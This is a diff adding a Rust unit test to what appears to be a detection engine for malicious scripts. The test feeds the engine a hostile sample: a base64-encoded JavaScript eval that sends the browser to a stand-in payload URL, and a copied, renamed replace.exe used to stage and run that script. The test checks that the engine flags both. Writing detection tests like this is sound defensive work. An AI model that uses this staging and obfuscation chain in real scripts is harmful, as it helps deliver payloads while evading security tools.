@@ -19639,6 +19639,33 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copied_replace_alias_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXJlcGxhY2UuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+copy C:\Windows\System32\replace.exe C:\Users\Public\rp.tmp
+C:\Users\Public\rp.tmp original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rp.tmp"#)
+            )),
+            "copied replace alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copied-replace.example/payload")
+            }),
+            "copied replace generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn replace_slash_directory_destination_preserves_generated_script_content() {
         let report = analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcmVwbGFjZS1zbGFzaC1kaXIuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
